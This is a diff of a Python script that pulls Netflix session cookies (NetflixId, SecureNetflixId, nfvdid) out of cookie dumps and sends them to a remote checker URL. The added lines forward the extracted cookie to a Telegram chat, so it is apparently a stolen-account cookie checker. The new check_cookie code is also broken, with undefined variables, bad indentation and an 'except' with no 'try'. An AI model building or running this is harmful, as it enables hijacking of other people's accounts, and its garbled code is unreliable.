@@ -20,13 +20,9 @@ def extract_cookie_from_text(text):
         line = line.strip()
         if not line:
             continue
-        
-        # Check each cookie key
         for key in COOKIE_KEYS:
             if key in line:
-                # Split by tab
                 parts = line.split("\t")
-                # Find the key position and get value after it
                 for i, part in enumerate(parts):
                     if part.strip() == key:
                         if i + 1 < len(parts):
@@ -38,29 +34,28 @@ def extract_cookie_from_text(text):
     # Method 2: key=value format
     if not cookie_dict:
         for key in COOKIE_KEYS:
-            match = re.search(
-                rf"(?<!\w){re.escape(key)}=([^;,\n\r\s]+)", text
-            )
+            match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\n\r\s]+)", text)
             if match:
                 cookie_dict[key] = match.group(1)
 
-    # Build cookie string
-    if cookie_dict:
-        parts = []
-        for key in COOKIE_KEYS:
-            if key in cookie_dict:
-                parts.append(f"{key}={cookie_dict[key]}")
-        return "; ".join(parts)
+    # Build cookie string - just use NetflixId=value format
+    if "NetflixId" in cookie_dict:
+        cookie_str = f"NetflixId={cookie_dict['NetflixId']}"
+        if "SecureNetflixId" in cookie_dict:
+            cookie_str += f"; SecureNetflixId={cookie_dict['SecureNetflixId']}"
+        if "nfvdid" in cookie_dict:
+            cookie_str += f"; nfvdid={cookie_dict['nfvdid']}"
+        return cookie_str
 
     return ""
 
 def check_cookie(cookie_raw):
-    try:
-        response = requests.get(
-            SCRAPE_URL,
-            params={"cookie": cookie_raw},
-            timeout=120
-        )
+    if i == 1:
+    context.bot.send_message(
+        chat_id=chat_id,
+        text=f"Cookie extracted:\n<code>{cookie_raw[:200]}</code>",
+        parse_mode=ParseMode.HTML
+    )
         return response.json()
     except Exception as e:
         return {"error": str(e)}
